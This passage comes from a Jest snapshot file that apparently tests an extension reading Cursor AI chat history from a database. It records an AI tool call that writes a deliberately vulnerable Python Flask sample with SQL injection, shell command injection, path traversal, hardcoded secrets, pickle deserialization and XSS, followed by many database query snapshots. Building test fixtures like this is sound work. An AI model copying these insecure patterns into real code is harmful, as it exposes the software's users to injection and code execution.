Deserialization\\nimport pickle\\n\\ndef load_user_data(data):\\n    \\"\\"\\"Vulnerable deserialization - uses pickle which can execute arbitrary code.\\"\\"\\"\\n    # VULNERABLE: Pickle can execute arbitrary code during deserialization\\n    user_data = pickle.loads(data)\\n    return user_data\\n\\n\\n# VULNERABILITY 6: XSS (if this were a web template)\\n@app.route('/search')\\ndef search():\\n    \\"\\"\\"Vulnerable endpoint - returns user input without sanitization.\\"\\"\\"\\n    query = request.args.get('q', '')\\n    # VULNERABLE: User input returned directly without escaping\\n    return f\\"<h1>Search results for: {query}</h1>\\"\\n\\n\\nif __name__ == '__main__':\\n    app.run(debug=True)  # VULNERABLE: Debug mode enabled in production\\n"}",
          "result": "{"diff":{"chunks":[{"diffString":"- \\n+ #!/usr/bin/env python3\\n+ \\"\\"\\"\\n+ Sample vulnerable code file for testing purposes.\\n+ This file contains intentional security vulnerabilities - DO NOT USE IN PRODUCTION.\\n+ \\"\\"\\"\\n+ \\n+ import os\\n+ import subprocess\\n+ import sqlite3\\n+ from flask import Flask, request\\n+ \\n+ app = Flask(__name__)\\n+ \\n+ # VULNERABILITY 1: SQL Injection\\n+ def get_user_data(username):\\n+     \\"\\"\\"Vulnerable SQL query - concatenates user input directly into SQL.\\"\\"\\"\\n+     conn = sqlite3.connect('users.db')\\n+     cursor = conn.cursor()\\n+     \\n+     # VULNERABLE: Direct string concatenation allows SQL injection\\n+     query = f\\"SELECT * FROM users WHERE username = '{username}'\\"\\n+     cursor.execute(query)\\n+     result = cursor.fetchone()\\n+     conn.close()\\n+     return result\\n+ \\n+ \\n+ # VULNERABILITY 2: Command Injection\\n+ def list_files(directory):\\n+     \\"\\"\\"Vulnerable command execution - uses user input in shell command.\\"\\"\\"\\n+     # VULNERABLE: User input passed directly to shell command\\n+     result = subprocess.run(f\\"ls -la {directory}\\", shell=True, capture_output=True)\\n+     return result.stdout.decode()\\n+ \\n+ \\n+ # VULNERABILITY 3: Path Traversal\\n+ def read_file(filename):\\n+     \\"\\"\\"Vulnerable file access - no path validation.\\"\\"\\"\\n+     # VULNERABLE: No validation allows accessing files outside intended directory\\n+     file_path = f\\"/var/www/uploads/{filename}\\"\\n+     with open(file_path, 'r') as f:\\n+         return f.read()\\n+ \\n+ \\n+ # VULNERABILITY 4: Hardcoded Secret\\n+ API_KEY = \\"sk_live_1234567890abcdef\\"  # VULNERABLE: Hardcoded secret key\\n+ DATABASE_PASSWORD = \\"admin123\\"  # VULNERABLE: Hardcoded password\\n+ \\n+ \\n+ # VULNERABILITY 5: Insecure Deserialization\\n+ import pickle\\n+ \\n+ def load_user_data(data):\\n+     \\"\\"\\"Vulnerable deserialization - uses pickle which can execute arbitrary code.\\"\\"\\"\\n+     # VULNERABLE: Pickle can execute arbitrary code during deserialization\\n+     user_data = pickle.loads(data)\\n+     return user_data\\n+ \\n+ \\n+ # VULNERABILITY 6: XSS (if this were a web template)\\n+ @app.route('/search')\\n+ def search():\\n+     \\"\\"\\"Vulnerable endpoint - returns user input without sanitization.\\"\\"\\"\\n+     query = request.args.get('q', '')\\n+     # VULNERABLE: User input returned directly without escaping\\n+     return f\\"<h1>Search results for: {query}</h1>\\"\\n+ \\n+ \\n+ if __name__ == '__main__':\\n+     app.run(debug=True)  # VULNERABLE: Debug mode enabled in production\\n+ ","oldStart":1,"newStart":1,"oldLines":1,"newLines":71,"linesRemoved":1,"linesAdded":71}],"editor":"EDITOR_AI"},"shouldAutoFixLints":true,"resultForModel":"Wrote contents to /Users/jonathanafek/src/autofixer/vulnerable_sample.py.","contentsAfterEdit":"#!/usr/bin/env python3\\n\\"\\"\\"\\nSample vulnerable code file for testing purposes.\\nThis file contains intentional security vulnerabilities - DO NOT USE IN PRODUCTION.\\n\\"\\"\\"\\n\\nimport os\\nimport subprocess\\nimport sqlite3\\nfrom flask import Flask, request\\n\\napp = Flask(__name__)\\n\\n# VULNERABILITY 1: SQL Injection\\ndef get_user_data(username):\\n    \\"\\"\\"Vulnerable SQL query - concatenates user input directly into SQL.\\"\\"\\"\\n    conn = sqlite3.connect('users.db')\\n    cursor = conn.cursor()\\n    \\n    # VULNERABLE: Direct string concatenation allows SQL injection\\n    query = f\\"SELECT * FROM users WHERE username = '{username}'\\"\\n    cursor.execute(query)\\n    result = cursor.fetchone()\\n    conn.close()\\n    return result\\n\\n\\n# VULNERABILITY 2: Command Injection\\ndef list_files(directory):\\n    \\"\\"\\"Vulnerable command execution - uses user input in shell command.\\"\\"\\"\\n    # VULNERABLE: User input passed directly to shell command\\n    result = subprocess.run(f\\"ls -la {directory}\\", shell=True, capture_output=True)\\n    return result.stdout.decode()\\n\\n\\n# VULNERABILITY 3: Path Traversal\\ndef read_file(filename):\\n    \\"\\"\\"Vulnerable file access - no path validation.\\"\\"\\"\\n    # VULNERABLE: No validation allows accessing files outside intended directory\\n    file_path = f\\"/var/www/uploads/{filename}\\"\\n    with open(file_path, 'r') as f:\\n        return f.read()\\n\\n\\n# VULNERABILITY 4: Hardcoded Secret\\nAPI_KEY = \\"sk_live_1234567890abcdef\\"  # VULNERABLE: Hardcoded secret key\\nDATABASE_PASSWORD = \\"admin123\\"  # VULNERABLE: Hardcoded password\\n\\n\\n# VULNERABILITY 5: Insecure Deserialization\\nimport pickle\\n\\ndef load_user_data(data):\\n    \\"\\"\\"Vulnerable deserialization - uses pickle which can execute arbitrary code.\\"\\"\\"\\n    # VULNERABLE: Pickle can execute arbitrary code during deserialization\\n    user_data = pickle.loads(data)\\n    return user_data\\n\\n\\n# VULNERABILITY 6: XSS (if this were a web template)\\n@app.route('/search')\\ndef search():\\n    \\"\\"\\"Vulnerable endpoint - returns user input without sanitization.\\"\\"\\"\\n    query = request.args.get('q', '')\\n    # VULNERABLE: User input returned directly without escaping\\n    return f\\"<h1>Search results for: {query}</h1>\\"\\n\\n\\nif __name__ == '__main__':\\n    app.run(debug=True)  # VULNERABLE: Debug mode enabled in production\\n\\n"}",
        },
        "type": "TOOL_EXECUTION",
      },
    ],
    "responseTime": "2025-11-05T12:12:26.053Z",
    "tool": "Cursor",
  },
]
`;

exports[`extension tests > 'full database scenario without thinki…' > full-state.vscdb-getRowsByLike-call 1`] = `[]`;

exports[`extension tests > 'full database scenario without thinki…' > full-state.vscdb-getRowsByLike-call-1 1`] = `
[
  {
    "key": "bubbleId:%",
    "keyOnly": true,
  },
]
`;

exports[`extension tests > 'full database scenario without thinki…' > full-state.vscdb-getRowsByLike-call-2 1`] = `
[
  {
    "key": "bubbleId:5ab4c616-183d-498c-a65c-7a2935a9f46c:54803258-5483-485b-895f-4b0b703781c8",
    "keyOnly": false,
  },
]
`;

exports[`extension tests > 'full database scenario without thinki…' > full-state.vscdb-getRowsByLike-call-3 1`] = `
[
  {
    "key": "bubbleId:5ab4c616-183d-498c-a65c-7a2935a9f46c:5f4c8d99-2985-41df-8607-8ee28cfb890c",
    "keyOnly": false,
  },
]
`;

exports[`extension tests > 'full database scenario without thinki…' > full-state.vscdb-getRowsByLike-call-4 1`] = `
[
  {
    "key": "bubbleId:5ab4c616-183d-498c-a65c-7a2935a9f46c:7e9c54fb-9efb-4a5c-9aeb-d1cf08b84a28",
    "keyOnly": false,
  },
]
`;

exports[`extension tests > 'full database scenario without thinki…' > full-state.vscdb-getRowsByLike-call-5 1`] = `
[
  {
    "key": "bubbleId:5ab4c616-183d-498c-a65c-7a2935a9f46c:99b6071d-54db-4d5a-907b-b04acdf5a3b9",
    "keyOnly": false,
  },
]
`;

exports[`extension tests > 'full database scenario without thinki…' > full-state.vscdb-getRowsByLike-call-6 1`] = `
[
  {
    "key": "bubbleId:5ab4c616-183d-498c-a65c-7a2935a9f46c:9ef5f6bc-4689-4c20-9347-929469e3f36f",
    "keyOnly": false,
  },
]
`;

exports[`extension tests > 'full database scenario without thinki…' > full-state.vscdb-getRowsByLike-call-7 1`] = `
[
  {
    "key": "bubbleId:5ab4c616-183d-498c-a65c-7a2935a9f46c:be2f7a3c-7d35-4d2e-972e-712dea4884cb",
    "keyOnly": false,
  },
]
`;

exports[`extension tests > 'full database scenario without thinki…' > full-state.vscdb-getRowsByLike-call-8 1`] = `
[
  {
    "key": "bubbleId:5ab4c616-183d-498c-a65c-7a2935a9f46c:c53e4c85-dcd2-48e2-86dd-bdcf292af082",
    "keyOnly": false,
  },
]
`;

exports[`extension tests > 'full database scenario without thinki…' > full-state.vscdb-getRowsByLike-call-9 1`] = `
[
  {
    "key": "bubbleId:5ab4c616-183d-498c-a65c-7a2935a9f46c:eed660a6-b995-4470-a1c3-adfda043c92c",
    "keyOnly": false,
  },
]
`;

exports[`extension tests > 'full database scenario without thinki…' > full-state.vscdb-getRowsByLike-call-10 1`] = `
[
  {
    "key": "bubbleId:5ab4c616-183d-498c-a65c-7a2935a9f46c:fda8fd24-131d-48f7-a527-d63fd600c14c",
    "keyOnly": false,
  },
]
`;

exports[`extension tests > 'full database scenario without thinki…' > full-state.vscdb-getRowsByLike-call-11 1`] = `
[
  {
    "key": "composerData:%",
    "keyOnly": false,
    "value": "%e6dce7c8-43e3-466f-8206-8d07703f8333%",
  },
]
`;

exports[`extension tests > 'full database scenario without thinki…' > full-state.vscdb-getRowsByLike-call-12 1`] = `
[
  {
    "key": "bubbleId:%:eed660a6-b995-4470-a1c3-adfda043c92c",
    "keyOnly": false,
  },
]
`;

exports[`extension tests > 'full database scenario without thinki…' > full-state.vscdb-getRowsByLike-call-13 1`] = `
[
  {
    "key": "bubbleId:%:7e9c54fb-9efb-4a5c-9aeb-d1cf08b84a28",
    "keyOnly": false,
  },
]
`;

exports[`extension tests > 'full database scenario without thinki…' > full-state.vscdb-getRowsByLike-call-14 1`] = `
[
  {
    "key": "bubbleId:%:be2f7a3c-7d35-4d2e-972e-712dea4884cb",
    "keyOnly": false,
  },
]
`;

exports[`extension tests > 'full database scenario without thinki…' > full-state.vscdb-getRowsByLike-call-15 1`] = `
[
  {
    "key": "bubbleId:%:9ef5f6bc-4689-4c20-9347-929469e3f36f",
    "keyOnly": false,
  },
]
`;

exports[`extension tests > 'full database scenario without thinki…' > full-state.vscdb-getRowsByLike-call-16 1`] = `
[
  {
    "key": "bubbleId:%:99b6071d-54db-4d5a-907b-b04acdf5a3b9",
    "keyOnly": false,
  },
]
`;

exports[`extension tests > 'full database scenario without thinki…' > full-state.vscdb-getRowsByLike-call-17 1`] = `
[
  {
    "key": "bubbleId:%:54803258-5483-485b-895f-4b0b703781c8",
    "keyOnly": false,
  },
]
`;

exports[`extension tests > 'full database scenario without thinki…' > full-state.vscdb-getRowsByLike-call-18 1`] = `
[
  {
    "key": "bubbleId:%:fda8fd24-131d-48f7-a527-d63fd600c14c",
    "keyOnly": false,
  },
]
`;

exports[`extension tests > 'full database scenario without thinki…' > full-state.vscdb-getRowsByLike-call-19 1`] = `
[
  {
    "key": "bubbleId:%:c53e4c85-dcd2-48e2-86dd-bdcf292af082",
    "keyOnly": false,
  },
]
`;

exports[`extension tests > 'full database scenario without thinki…' > full-state.vscdb-getRowsByLike-call-20 1`] = `
[
  {
    "key": "bubbleId:%:5f4c8d99-2985-41df-8607-8ee28cfb890c",
    "keyOnly": false,
  },
]
`;

exports[`extension tests > 'full database scenario without thinki…' > full-state.vscdb-getRowsByLike-call-21 1`] = `
[
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:0056c9a5-859b-4b7d-91aa-788a6fdededa",
    "keyOnly": false,
  },
]
`;

exports[`extension tests > 'full database scenario without thinki…' > full-state.vscdb-getRowsByLike-call-22 1`] = `
[
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:028cac40-7b1c-457d-bbf1-a80e23dd2cbb",
    "keyOnly": false,
  },
]
`;

exports[`extension tests > 'full database scenario without thinki…' > full-state.vscdb-getRowsByLike-call-23 1`] = `
[
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:02cffbaf-93cb-47bb-96f3-8a1372a9b5de",
    "keyOnly": false,
  },
]
`;

exports[`extension tests > 'full database scenario without thinki…' > full-state.vscdb-getRowsByLike-call-24 1`] = `
[
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:0373b0ea-305b-4f33-881c-5a466ef7d0e6",
    "keyOnly": false,
  },
]
`;

exports[`extension tests > 'full database scenario without thinki…' > full-state.vscdb-getRowsByLike-call-25 1`] = `
[
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:0479c335-53be-4397-abc7-e6a80acda689",
    "keyOnly": false,
  },
]
`;

exports[`extension tests > 'full database scenario without thinki…' > full-state.vscdb-getRowsByLike-call-26 1`] = `
[
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:04ec8cee-0472-4ca6-ad85-eb28f3b81e8c",
    "keyOnly": false,
  },
]
`;

exports[`extension tests > 'full database scenario without thinki…' > full-state.vscdb-getRowsByLike-call-27 1`] = `
[
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:058513f2-aba7-449f-8e3b-7bba6cbceecc",
    "keyOnly": false,
  },
]
`;

exports[`extension tests > 'full database scenario without thinki…' > full-state.vscdb-getRowsByLike-call-28 1`] = `
[
  {
    "key": "composerData:%",
    "keyOnly": false,
    "value": "%d90b6334-7162-4883-b2ff-a31da2d5802d%",
  },
]
`;

exports[`extension tests > 'full database scenario without thinki…' > full-state.vscdb-getRowsByLike-call-29 1`] = `
[
  {
    "key": "bubbleId:%:a8671dbe-8f02-428a-944f-35d85ea032f1",
    "keyOnly": false,
  },
]
`;

exports[`extension tests > 'full database scenario without thinki…' > full-state.vscdb-getRowsByLike-call-30 1`] = `
[
  {
    "key": "bubbleId:%:16164b13-55d2-4d24-a754-3c21fa4ccdab",
    "keyOnly": false,
  },
]
`;

exports[`extension tests > 'full database scenario without thinki…' > full-state.vscdb-getRowsByLike-call-31 1`] = `
[
  {
    "key": "bubbleId:%:470dcce6-6177-464d-b43c-4b641778e412",
    "keyOnly": false,
  },
]
`;

exports[`extension tests > 'full database scenario without thinki…' > full-state.vscdb-getRowsByLike-call-32 1`] = `
[
  {
    "key": "bubbleId:%:c318e799-a2c1-4cbd-9f0f-a3fe578ce21e",
    "keyOnly": false,
  },
]
`;

exports[`extension tests > 'full database scenario without thinki…' > full-state.vscdb-getRowsByLike-call-33 1`] = `
[
  {
    "key": "bubbleId:%:aec14c07-95b1-4f2a-bb8e-733459f9abfd",
    "keyOnly": false,
  },
]
`;

exports[`extension tests > 'full database scenario without thinki…' > full-state.vscdb-getRowsByLike-call-34 1`] = `
[
  {
    "key": "bubbleId:%:462589a9-1a94-4ca1-956b-232feb5eb4d3",
    "keyOnly": false,
  },
]
`;

exports[`extension tests > 'full database scenario without thinki…' > full-state.vscdb-getRowsByLike-call-35 1`] = `
[
  {
    "key": "bubbleId:%:354309a1-8d7b-44c6-b03b-cd8ad0daf622",
    "keyOnly": false,
  },
]
`;

exports[`extension tests > 'full database scenario without thinki…' > full-state.vscdb-getRowsByLike-call-36 1`] = `
[
  {
    "key": "bubbleId:%:9e6f44f2-4782-4373-9887-bb890a26214e",
    "keyOnly": false,
  },
]
`;

exports[`extension tests > 'full database scenario without thinki…' > full-state.vscdb-getRowsByLike-call-37 1`] = `
[
  {
    "key": "bubbleId:%:5549b140-13d6-4085-bada-7a78200fa06b",
    "keyOnly": false,
  },
]
`;

exports[`extension tests > 'full database scenario without thinki…' > full-state.vscdb-getRowsByLike-call-38 1`] = `
[
  {
    "key": "bubbleId:%:99db702c-3b9f-4c60-ba54-cd6116b88e90",
    "keyOnly": false,
  },
]
`;

exports[`extension tests > 'full database scenario without thinki…' > full-state.vscdb-getRowsByLike-call-39 1`] = `
[
  {
    "key": "bubbleId:%:8d0c07ec-9934-44ff-8996-eb4c00bf86b6",
    "keyOnly": false,
  },
]
`;

exports[`extension tests > 'full database scenario without thinki…' > full-state.vscdb-getRowsByLike-call-40 1`] = `
[
  {
    "key": "bubbleId:%:e0ed03a1-7513-431a-8363-49f6733c309b",
    "keyOnly": false,
  },
]
`;

exports[`extension tests > 'full database scenario without thinki…' > full-state.vscdb-getRowsByLike-call-41 1`] = `
[
  {
    "key": "bubbleId:%:bf6b0eea-d94d-4c87-acc7-a898f080cc4c",
    "keyOnly": false,
  },
]
`;

exports[`extension tests > 'full database scenario without thinki…' > full-state.vscdb-getRowsByLike-call-42 1`] = `
[
  {
    "key": "bubbleId:%:a2915804-4bfa-42ec-8984-5d0a8f295a0f",
    "keyOnly": false,
  },
]
`;

exports[`extension tests > 'full database scenario without thinki…' > full-state.vscdb-getRowsByLike-call-43 1`] = `
[
  {
    "key": "bubbleId:%:b3dc23bf-da3f-45f4-a01d-ac170a73f955",
    "keyOnly": false,
  },
]
`;

exports[`extension tests > 'full database scenario without thinki…' > full-state.vscdb-getRowsByLike-call-44 1`] = `
[
  {
    "key": "bubbleId:%:9ee2f72e-88c1-4c65-89d7-0f2b87a024d6",
    "keyOnly": false,
  },
]
`;

exports[`extension tests > 'full database scenario without thinki…' > full-state.vscdb-getRowsByLike-call-45 1`] = `
[
  {
    "key": "bubbleId:%:2f4bac40-80e1-4033-a90c-2fbcbe4e3b7e",
    "keyOnly": false,
  },
]
`;

exports[`extension tests > 'full database scenario without thinki…' > full-state.vscdb-getRowsByLike-call-46 1`] = `
[
  {
    "key": "bubbleId:%:72359e21-fcd5-4393-90bb-c4f218cc2cb2",
    "keyOnly": false,
  },
]
`;

exports[`extension tests > 'full database scenario without thinki…' > full-state.vscdb-getRowsByLike-call-47 1`] = `
[
  {
    "key": "bubbleId:%:bbbe25bd-d09e-41f2-a5f3-ee8dab9da51c",
    "keyOnly": false,
  },
]
`;

exports[`extension tests > 'full database scenario without thinki…' > full-state.vscdb-getRowsByLike-call-48 1`] = `
[
  {
    "key": "bubbleId:%:09ceaf85-752d-470a-b853-b4524a17dd8c",
    "keyOnly": false,
  },
]
`;

exports[`extension tests > 'full database scenario without thinki…' > full-state.vscdb-getRowsByLike-call-49 1`] = `
[
  {
    "key": "bubbleId:%:f1c8cb8a-bad0-402b-ab2a-951c4f67c5cd",
    "keyOnly": false,
  },
]
`;

exports[`extension tests > 'full database scenario without thinki…' > full-state.vscdb-getRowsByLike-result-1 1`] = `
[
  {
    "key": "bubbleId:5ab4c616-183d-498c-a65c-7a2935a9f46c:54803258-5483-485b-895f-4b0b703781c8",
  },
  {
    "key": "bubbleId:5ab4c616-183d-498c-a65c-7a2935a9f46c:5f4c8d99-2985-41df-8607-8ee28cfb890c",
  },
  {
    "key": "bubbleId:5ab4c616-183d-498c-a65c-7a2935a9f46c:7e9c54fb-9efb-4a5c-9aeb-d1cf08b84a28",
  },
  {
    "key": "bubbleId:5ab4c616-183d-498c-a65c-7a2935a9f46c:99b6071d-54db-4d5a-907b-b04acdf5a3b9",
  },
  {
    "key": "bubbleId:5ab4c616-183d-498c-a65c-7a2935a9f46c:9ef5f6bc-4689-4c20-9347-929469e3f36f",
  },
  {
    "key": "bubbleId:5ab4c616-183d-498c-a65c-7a2935a9f46c:be2f7a3c-7d35-4d2e-972e-712dea4884cb",
  },
  {
    "key": "bubbleId:5ab4c616-183d-498c-a65c-7a2935a9f46c:c53e4c85-dcd2-48e2-86dd-bdcf292af082",
  },
  {
    "key": "bubbleId:5ab4c616-183d-498c-a65c-7a2935a9f46c:eed660a6-b995-4470-a1c3-adfda043c92c",
  },
  {
    "key": "bubbleId:5ab4c616-183d-498c-a65c-7a2935a9f46c:fda8fd24-131d-48f7-a527-d63fd600c14c",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:0056c9a5-859b-4b7d-91aa-788a6fdededa",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:028cac40-7b1c-457d-bbf1-a80e23dd2cbb",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:02cffbaf-93cb-47bb-96f3-8a1372a9b5de",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:0373b0ea-305b-4f33-881c-5a466ef7d0e6",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:0479c335-53be-4397-abc7-e6a80acda689",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:04ec8cee-0472-4ca6-ad85-eb28f3b81e8c",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:058513f2-aba7-449f-8e3b-7bba6cbceecc",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:05c5b297-05fd-46af-8a30-e3fb7cdc208d",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:063560e4-a300-4363-8040-a7b3b99d180e",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:06bec39c-a420-44e1-8901-257c1687adb3",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:07e60d3a-c118-4918-82e6-b4475aa49d3b",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:09ceaf85-752d-470a-b853-b4524a17dd8c",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:0ca4c1c8-d4e5-4e69-8709-1f648fb8f306",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:0cdade13-5177-4c56-802f-43ac65b91cae",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:0d88a3d1-40f7-403f-819f-8caaccb0ae13",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:0e1ed1bb-4bd8-496b-8f87-fa6033a5b3d9",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:10259b4e-777f-48de-b566-b705c236872c",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:10a80a33-144c-40f5-919e-cd462aa26c2f",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:10e93b02-7d34-4558-b9d3-38ca22fa7cd0",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:1169aa0f-2edc-4258-88f3-982399349f76",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:11eecd61-b006-487a-9bea-f2a661336bd5",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:135fdbb7-55af-4a98-a964-500ef3585e91",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:14b54607-5b85-474a-9e24-89b6ba61adeb",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:15088c46-25ff-4963-b5d8-f2d79e1aa661",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:16164b13-55d2-4d24-a754-3c21fa4ccdab",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:17006763-caff-4688-ab50-e73e61dcdefb",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:20358b0a-a113-43a9-b53e-2305f82ae2d0",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:246c1ae1-899f-41c1-b8d8-62839f3147ba",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:26c4e848-8ac3-47e0-8f38-a400d774949b",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:28624d07-ee36-48c3-b029-2b3ffb503591",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:2a1915e3-be31-4d7d-acb5-e7e69c3455c7",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:2b11edac-9a03-481e-992d-cb2941b0d4ee",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:2f4bac40-80e1-4033-a90c-2fbcbe4e3b7e",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:32060cd4-f99b-4bbe-bc17-7d2058e8691f",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:33baf043-0afa-44f5-b3fc-37f3fe5b2777",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:34d48125-3262-4c8b-aa85-d1d682797c24",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:354309a1-8d7b-44c6-b03b-cd8ad0daf622",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:3674dbb4-9c1c-4254-92a7-7e6588b5a738",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:37b27e17-68e4-48ef-864b-422559538c33",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:39ce1345-7e78-435e-8c6f-95142b0eea52",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:3f1dc033-044e-45ef-90b9-22a87f325c5a",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:40d420a2-5b34-44ef-bd35-aabf7069d42c",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:424b33b2-a7b5-4ba5-8989-4db4eb8aebf5",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:44b7fc77-0875-4e3d-a9cc-f1312a4fc238",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:462589a9-1a94-4ca1-956b-232feb5eb4d3",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:470dcce6-6177-464d-b43c-4b641778e412",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:48687ba0-76e4-4a3c-96d1-b997e8fbf745",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:4b22a165-5e37-43d2-9a21-84e0b5a86216",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:4d6ca93d-5387-4144-8e97-3f23fbd9b518",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:4fcd9617-7446-4df5-8ff7-d6a22f6b598c",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:5082343a-a1ac-4eff-a2be-5b7f27a96a2e",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:51c6da5f-33e7-43d5-bf1b-8d8e787a92c4",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:51cbfac7-5037-4cf2-8235-30bd11ba26a0",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:51d7caf4-0b94-4b5c-8750-1d09a9ca88ec",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:5396746f-2ba0-4fe4-91a4-456b134359df",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:543a18ab-2412-45f5-9fbb-90f0348fbdc0",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:5549b140-13d6-4085-bada-7a78200fa06b",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:5c6cc316-ae9f-4000-b36c-ba99def572e5",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:5f8e5411-99c8-48da-96e6-04928c048e90",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:5f9b9b76-61f5-4ee3-92a2-ff67d159211f",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:60590c4d-1080-4028-8feb-b3ffe9aa9759",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:61bbc729-6a32-418e-85a6-c82e05ae00be",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:64e04b3b-260a-4e94-9d71-858d21971508",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:652f36dc-73e8-4cd5-a36f-5e044bb31623",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:665eb4e4-05fe-46e5-8639-3f7d565da699",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:670ee031-ee48-4fca-a778-3ad9275dc48e",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:6b749c92-5a45-4b4e-adc4-96a479421ac5",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:703c7088-988e-4983-b1fd-614be28daf00",
  },
  {
